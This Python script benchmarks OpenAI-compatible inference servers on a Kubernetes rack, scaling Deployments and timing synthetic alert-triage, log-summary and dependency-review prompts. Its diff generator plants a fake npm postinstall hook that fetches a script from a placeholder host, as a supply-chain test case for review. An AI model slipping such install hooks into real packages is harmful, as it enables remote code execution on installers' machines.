#!/usr/bin/env python3
"""Benchmark OpenAI-compatible inference servers on the rack, one at a time.

For each target in targets.json it scales every other target to 0 (they share
one worker's RAM), scales the target to 1, port-forwards its Service, sends one
warm-up request and then the measured prompts, and finally restores every
Deployment's original replica count, also on Ctrl-C or error.

Per request it records time to first token (TTFT), prefill tok/s (prompt
tokens / TTFT), decode tok/s (completion tokens after the first / time after
the first) and, when the server reports them (llama.cpp, ik_llama.cpp), the
engine's own timings. Prompts are synthetic but shaped like the real jobs:
Zabbix alert batches, node logs and dependency diffs. Each request starts with
a nonce so no engine can answer from its prompt cache.

Needs only Python 3.9+ and kubectl. Example:
    ./bench.py targets.json                       # everything, 3 repeats
    ./bench.py targets.json --quick               # smoke test
    ./bench.py targets.json --only llama-cpp --sizes 2048 --workloads log
"""
import argparse
import base64
import json
import os
import random
import signal
import socket
import statistics
import subprocess
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone

WORKLOADS = ("alert", "log", "diff")
CHARS_PER_TOKEN = 3.6  # rough, for sizing prompts; real counts come from usage


# --------------------------------------------------------------------------- prompts

def _alert_lines(rng):
    hosts = ["w1", "w2", "w3", "cp1", "cp2", "cp3", "usw-pro-max", "udm-pro-se", "pg-1", "pg-2"]
    problems = [
        ("High", "Disk space is low (used > 90%) on /var/lib/longhorn"),
        ("Average", "Node {h}: kubelet PLEG is not healthy"),
        ("Warning", "Interface eth0: high error rate (> 2% for 5m)"),
        ("Disaster", "PostgreSQL: replication lag is too high (> 300s)"),
        ("Information", "Certificate expires in less than 30 days: grafana.example.com"),
        ("High", "Pod ai/colibri restarted more than 3 times in 15m"),
        ("Average", "Patroni: cluster has no leader"),
        ("Warning", "Load average is too high (per CPU load over 1.5 for 5m)"),
        ("Average", "Calico: BGP peer {h} is down"),
        ("Warning", "Zabbix agent is not available (for 3m)"),
    ]
    eid = 900000
    while True:
        eid += rng.randint(1, 40)
        h = rng.choice(hosts)
        sev, text = rng.choice(problems)
        ts = f"2026-11-0{rng.randint(1, 3)} {rng.randint(0, 23):02d}:{rng.randint(0, 59):02d}:{rng.randint(0, 59):02d}"
        status = rng.choice(["PROBLEM", "PROBLEM", "RESOLVED"])
        yield json.dumps({"eventid": eid, "time": ts, "host": h, "severity": sev,
                          "status": status, "name": text.format(h=h),
                          "value": round(rng.uniform(0, 100), 1)})


def _log_lines(rng):
    units = ["kubelet", "containerd", "calico-node", "longhorn-manager", "kernel", "sshd", "flux-helm-controller"]
    msgs = [
        'E1103 {t} 1234 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \\"StartContainer\\" for \\"llama-server\\" with CrashLoopBackOff"',
        'level=info msg="ImageCreate event name:\\"ghcr.io/sifungurux/llama-cpp@sha256:{x}\\""',
        "bird: Mesh_{ip}: State changed to {st}",
        "time=\"{t}\" level=warning msg=\"replica rebuild is taking longer than expected\" volume=pvc-{x}",
        "[{f}] Memory cgroup out of memory: Killed process {p} (llama-server) total-vm:{v}kB",
        "Accepted publickey for ansible-executor from 192.0.2.{o} port {p} ssh2",
        'reconciliation finished in {d}s, next run in 30m0s" kind=HelmRelease name=colibri',
        "I1103 {t} 1234 kubelet.go:2400] \"SyncLoop (probe)\" probe=\"readiness\" status=\"ready\" pod=\"ai/colibri-{x}\"",
    ]
    while True:
        t = f"{rng.randint(0, 23):02d}:{rng.randint(0, 59):02d}:{rng.randint(0, 59):02d}.{rng.randint(0, 999999):06d}"
        m = rng.choice(msgs).format(
            t=t, x=f"{rng.getrandbits(48):012x}", ip=f"192_0_2_{rng.randint(2, 14)}",
            st=rng.choice(["up", "down", "start"]), f=f"{rng.uniform(1000, 99999):.6f}",
            p=rng.randint(1000, 65000), v=rng.randint(10**7, 4 * 10**7), o=rng.randint(2, 254),
            d=round(rng.uniform(0.2, 9), 2))
        yield f"Nov 03 {t[:8]} w{rng.randint(1, 3)} {rng.choice(units)}[{rng.randint(100, 9999)}]: {m}"


def _diff_lines(rng):
    pkgs = ["left-pad", "lodash", "axios", "chalk", "debug", "semver", "minimist", "tar", "node-fetch",
            "requests", "urllib3", "pyyaml", "cryptography", "esbuild", "ws", "follow-redirects"]
    yield "diff --git a/package-lock.json b/package-lock.json"
    yield "--- a/package-lock.json"
    yield "+++ b/package-lock.json"
    while True:
        p = rng.choice(pkgs)
        a, b = f"{rng.randint(0, 9)}.{rng.randint(0, 30)}.{rng.randint(0, 20)}", f"{rng.randint(0, 9)}.{rng.randint(0, 30)}.{rng.randint(0, 20)}"
        yield f"@@ -{rng.randint(10, 9000)},7 +{rng.randint(10, 9000)},7 @@"
        yield f'     "node_modules/{p}": {{'
        yield f'-      "version": "{a}",'
        yield f'+      "version": "{b}",'
        yield f'-      "integrity": "sha512-{base64.b64encode(rng.randbytes(24)).decode()}",'
        yield f'+      "integrity": "sha512-{base64.b64encode(rng.randbytes(24)).decode()}",'
        if rng.random() < 0.08:
            yield '+      "hasInstallScript": true,'
            yield f'+      "scripts": {{ "postinstall": "node -e \\"require(\'https\').get(\'https://cdn.example.net/{rng.getrandbits(32):08x}.js\')\\"" }},'
        yield "       \"license\": \"MIT\""


INSTRUCTIONS = {
    "alert": ("You triage Zabbix events for a homelab Kubernetes rack. For each PROBLEM event below, "
              "answer with one JSON line {\"eventid\": ..., \"action\": \"page\"|\"ticket\"|\"ignore\", "
              "\"duplicate_of\": eventid|null}. Then one sentence on the most urgent issue.\n\nEvents:\n"),
    "log": ("Summarise these node logs for an on-call engineer: list distinct incidents, affected "
            "nodes and pods, and the likely root cause of each, in at most 8 bullet points.\n\nLogs:\n"),
    "diff": ("Review this dependency diff for supply-chain risk. Flag new install scripts, suspicious "
             "URLs and unexpected major-version jumps, each with the package name and why, then give "
             "an overall verdict: merge, needs review, or block.\n\nDiff:\n"),
}
GENERATORS = {"alert": _alert_lines, "log": _log_lines, "diff": _diff_lines}


def make_prompt(workload, size_tokens, seed):
    rng = random.Random(f"{workload}-{size_tokens}-{seed}")
    budget = int(size_tokens * CHARS_PER_TOKEN) - len(INSTRUCTIONS[workload])
    lines, used = [], 0
    for line in GENERATORS[workload](rng):
        if used + len(line) + 1 > budget:
            break
        lines.append(line)
        used += len(line) + 1
    return INSTRUCTIONS[workload] + "\n".join(lines)


def load_prompts_dir(path):
    """Real inputs: <workload>-<anything>.txt, the whole file is the user message."""
    out = []
    for name in sorted(os.listdir(path)):
        if name.endswith(".txt"):
            with open(os.path.join(path, name), encoding="utf-8") as f:
                out.append((name.split("-", 1)[0], name[:-4], f.read()))
    return out


# --------------------------------------------------------------------------- kube

def kubectl(*args, check=True, capture=True, timeout=None):
    r = subprocess.run(["kubectl", *args], text=True, timeout=timeout,
                       stdout=subprocess.PIPE if capture else None,
                       stderr=subprocess.PIPE if capture else None)
    if check and r.returncode != 0:
        raise RuntimeError(f"kubectl {' '.join(args)}: {(r.stderr or '').strip()}")
    return (r.stdout or "").strip()


def get_replicas(t):
    return int(kubectl("-n", t["namespace"], "get", "deploy", t["deployment"], "-o", "jsonpath={.spec.replicas}") or 0)


def scale(t, n):
    kubectl("-n", t["namespace"], "scale", "deploy", t["deployment"], f"--replicas={n}")


def wait_scaled_down(t, timeout=600):
    end = time.time() + timeout
    while time.time() < end:
        pods = kubectl("-n", t["namespace"], "get", "deploy", t["deployment"], "-o", "jsonpath={.status.replicas}")
        if pods in ("", "0"):
            return
        time.sleep(3)
    raise RuntimeError(f"{t['name']}: pods still running after {timeout}s")


def api_key(t):
    if "apiKey" in t:
        return t["apiKey"]
    if not t.get("secret"):
        return None
    raw = kubectl("-n", t["namespace"], "get", "secret", t["secret"], "-o",
                  "jsonpath={.data." + t.get("secretKey", "api-key").replace(".", "\\.") + "}")
    return base64.b64decode(raw).decode().strip()


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class PortForward:
    def __init__(self, t):
        self.t, self.port, self.proc = t, free_port(), None

    def __enter__(self):
        self.proc = subprocess.Popen(
            ["kubectl", "-n", self.t["namespace"], "port-forward", f"svc/{self.t['service']}",
             f"{self.port}:{self.t['port']}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return f"http://127.0.0.1:{self.port}"

    def __exit__(self, *exc):
        if self.proc:
            self.proc.terminate()
            try:
                self.proc.wait(5)
            except subprocess.TimeoutExpired:
                self.proc.kill()


def cgroup_memory(t):
    """Peak (or current) memory of the server container, in GiB, via its cgroup."""
    base = ["-n", t["namespace"], "exec", f"deploy/{t['deployment']}"]
    if t.get("container"):
        base += ["-c", t["container"]]
    for f in ("memory.peak", "memory.current"):
        try:
            v = kubectl(*base, "--", "cat", f"/sys/fs/cgroup/{f}", timeout=30)
            return f, round(int(v) / 2**30, 2)
        except Exception:
            continue
    return None, None


# --------------------------------------------------------------------------- requests

def wait_healthy(base, path, timeout):
    end = time.time() + timeout
    last = None
    while time.time() < end:
        try:
            with urllib.request.urlopen(base + path, timeout=10) as r:
                if r.status == 200:
                    return
        except Exception as e:  # port-forward not up yet, or 503 while loading
            last = e
        time.sleep(5)
    raise RuntimeError(f"not healthy at {base}{path} after {timeout}s: {last}")


def chat(base, key, model, prompt, max_tokens, timeout):
    body = json.dumps({
        "model": model, "stream": True, "stream_options": {"include_usage": True},
        "temperature": 0, "max_tokens": max_tokens,
        "messages": [{"role": "user", "content": prompt}],
    }).encode()
    req = urllib.request.Request(base + "/v1/chat/completions", data=body, method="POST",
                                 headers={"Content-Type": "application/json", "Accept": "text/event-stream"})
    if key:
        req.add_header("Authorization", f"Bearer {key}")
    t0 = time.perf_counter()
    ttft, chunks, usage, timings, text = None, 0, None, None, []
    with urllib.request.urlopen(req, timeout=timeout) as r:
        for raw in r:
            line = raw.decode("utf-8", "replace").strip()
            if not line.startswith("data:"):
                continue
            data = line[5:].strip()
            if data == "[DONE]":
                break
            try:
                ev = json.loads(data)
            except json.JSONDecodeError:
                continue
            for ch in ev.get("choices") or []:
                d = ch.get("delta") or {}
                piece = (d.get("content") or "") + (d.get("reasoning_content") or "")
                if piece:
                    if ttft is None:
                        ttft = time.perf_counter() - t0
                    chunks += 1
                    text.append(d.get("content") or "")
            usage = ev.get("usage") or usage
            timings = ev.get("timings") or timings
    total = time.perf_counter() - t0
    usage = usage or {}
    ptok = usage.get("prompt_tokens")
    ctok = usage.get("completion_tokens") or chunks
    res = {
        "prompt_tokens": ptok, "completion_tokens": ctok, "ttft_s": ttft, "total_s": total,
        "prefill_tps": (ptok / ttft) if (ptok and ttft) else None,
        "decode_tps": ((ctok - 1) / (total - ttft)) if (ttft and ctok and ctok > 1 and total > ttft) else None,
        "output_head": "".join(text)[:160],
    }
    if timings:  # llama.cpp family: measured inside the engine, without HTTP overhead
        res["engine_prompt_tps"] = timings.get("prompt_per_second")
        res["engine_decode_tps"] = timings.get("predicted_per_second")
        res["engine_prompt_n"] = timings.get("prompt_n")
    return res


# --------------------------------------------------------------------------- run

def median(xs):
    xs = [x for x in xs if isinstance(x, (int, float))]
    return statistics.median(xs) if xs else None


def fmt(v, nd=1):
    return "–" if v is None else f"{v:.{nd}f}"


def summarise(results, mem):
    groups = {}
    for r in results:
        groups.setdefault((r["target"], r["workload"], r["size"]), []).append(r)
    rows = ["| Engine | Workload | Size | Prompt tok | TTFT s | Prefill tok/s | Decode tok/s | Engine prefill | Engine decode | Total s | OK |",
            "| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |"]
    for (tgt, wl, size), rs in groups.items():
        ok = [r for r in rs if not r.get("error")]
        rows.append("| {} | {} | {} | {} | {} | {} | {} | {} | {} | {} | {}/{} |".format(
            tgt, wl, size, fmt(median([r["prompt_tokens"] for r in ok]), 0),
            fmt(median([r["ttft_s"] for r in ok])), fmt(median([r["prefill_tps"] for r in ok])),
            fmt(median([r["decode_tps"] for r in ok])), fmt(median([r.get("engine_prompt_tps") for r in ok])),
            fmt(median([r.get("engine_decode_tps") for r in ok])), fmt(median([r["total_s"] for r in ok])),
            len(ok), len(rs)))
    out = ["Medians per engine, workload and prompt size. Prefill = prompt tokens / TTFT, "
           "decode = tokens after the first / time after the first. Engine columns are the "
           "server's own timings where it reports them.", "", *rows, ""]
    if mem:
        out += ["| Engine | Memory (cgroup) | GiB |", "| --- | --- | --- |"]
        out += [f"| {k} | {f or '–'} | {fmt(v, 2)} |" for k, (f, v) in mem.items()]
    return "\n".join(out) + "\n"


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("targets", help="JSON list of targets (see targets.example.json)")
    ap.add_argument("--only", nargs="*", help="target names to run (default: all)")
    ap.add_argument("--workloads", nargs="*", default=list(WORKLOADS), choices=WORKLOADS)
    ap.add_argument("--sizes", nargs="*", type=int, default=[512, 2048, 8192], help="prompt sizes in tokens (approx.)")
    ap.add_argument("--repeats", type=int, default=3)
    ap.add_argument("--max-tokens", type=int, default=256)
    ap.add_argument("--prompts-dir", help="use real inputs instead: <workload>-<name>.txt files")
    ap.add_argument("--quick", action="store_true", help="one workload, 512 and 2048 tokens, 1 repeat")
    ap.add_argument("--no-exclusive", action="store_true", help="don't scale the other targets down")
    ap.add_argument("--request-timeout", type=int, default=1800)
    ap.add_argument("--ready-timeout", type=int, default=1200)
    ap.add_argument("--out", default=f"results-{datetime.now(timezone.utc):%Y%m%dT%H%M%SZ}")
    a = ap.parse_args()
    if a.quick:
        a.workloads, a.sizes, a.repeats = a.workloads[:1], [512, 2048], 1

    with open(a.targets) as f:
        targets = json.load(f)
    run = [t for t in targets if not a.only or t["name"] in a.only]
    kube = [t for t in targets if not t.get("url")]
    original = {t["name"]: get_replicas(t) for t in kube}
    print("original replicas:", original, flush=True)

    def restore(*_):
        for t in kube:
            try:
                scale(t, original[t["name"]])
            except Exception as e:
                print(f"!! could not restore {t['name']}: {e}", file=sys.stderr)
        print("restored:", original, flush=True)

    def on_signal(signum, _frame):
        raise KeyboardInterrupt(f"signal {signum}")
    signal.signal(signal.SIGTERM, on_signal)

    if a.prompts_dir:
        cases = [(wl, name, text) for wl, name, text in load_prompts_dir(a.prompts_dir)]
    else:
        cases = [(wl, str(size), None) for wl in a.workloads for size in a.sizes]

    os.makedirs(a.out, exist_ok=True)
    results, mem = [], {}
    jsonl = open(os.path.join(a.out, "results.jsonl"), "a")
    try:
        for t in run:
            print(f"\n== {t['name']}", flush=True)
            if not t.get("url"):
                if not a.no_exclusive:
                    for o in kube:
                        if o["name"] != t["name"]:
                            scale(o, 0)
                    for o in kube:
                        if o["name"] != t["name"]:
                            wait_scaled_down(o)
                scale(t, 1)
                kubectl("-n", t["namespace"], "rollout", "status", f"deploy/{t['deployment']}",
                        f"--timeout={a.ready_timeout}s", capture=False)
            key = api_key(t)
            ctx = PortForward(t) if not t.get("url") else None
            base = ctx.__enter__() if ctx else t["url"].rstrip("/")
            try:
                wait_healthy(base, t.get("health", "/health"), a.ready_timeout)
                print("   warm-up …", flush=True)
                try:
                    chat(base, key, t["model"], f"[{time.time_ns()}] " + make_prompt("alert", 256, "warmup"),
                         32, a.request_timeout)
                except urllib.error.HTTPError as e:
                    # A 401 or 404 here (wrong key, wrong model name) fails every request: skip the target.
                    print(f"!! {t['name']}: warm-up failed with HTTP {e.code}: "
                          f"{e.read().decode('utf-8', 'replace')[:200]}; skipping", file=sys.stderr, flush=True)
                    continue
                for wl, label, text in cases:
                    for i in range(a.repeats):
                        prompt = f"[run {time.time_ns()}] " + (text or make_prompt(wl, int(label), i))
                        rec = {"target": t["name"], "workload": wl, "size": label, "repeat": i,
                               "time": datetime.now(timezone.utc).isoformat()}
                        try:
                            rec.update(chat(base, key, t["model"], prompt, a.max_tokens, a.request_timeout))
                        except urllib.error.HTTPError as e:
                            rec["error"] = f"HTTP {e.code}: {e.read().decode('utf-8', 'replace')[:200]}"
                        except (urllib.error.URLError, OSError, ValueError) as e:
                            rec["error"] = str(e)
                        results.append(rec)
                        jsonl.write(json.dumps(rec) + "\n")
                        jsonl.flush()
                        print("   {:<5} {:>5} #{}  prompt {:>5}  ttft {:>7}s  prefill {:>7}  decode {:>6}  {}".format(
                            wl, label, i, rec.get("prompt_tokens") or "–", fmt(rec.get("ttft_s")),
                            fmt(rec.get("prefill_tps")), fmt(rec.get("decode_tps")),
                            rec.get("error", "")), flush=True)
                if not t.get("url"):
                    mem[t["name"]] = cgroup_memory(t)
            finally:
                if ctx:
                    ctx.__exit__(None, None, None)
    except KeyboardInterrupt:
        print("\ninterrupted", file=sys.stderr)
    finally:
        jsonl.close()
        restore()
        summary = summarise(results, mem)
        with open(os.path.join(a.out, "summary.md"), "w") as f:
            f.write(summary)
        print("\n" + summary)
        print(f"results in {a.out}/")


if __name__ == "__main__":
    main()
